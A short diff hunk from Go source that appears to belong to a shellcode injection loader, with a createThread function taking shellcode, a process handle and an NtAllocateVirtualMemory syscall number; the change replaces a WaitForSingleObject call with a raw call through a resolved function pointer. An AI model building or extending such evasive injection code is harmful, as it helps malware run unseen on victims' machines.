@@ -154,7 +154,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //sizeofstackreserve
 		0,                                    //lpbytesbuffer
 	)
-	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
 	if r != nil {
 		fmt.Printf("1 %s %x\n", r, r1)
 		return
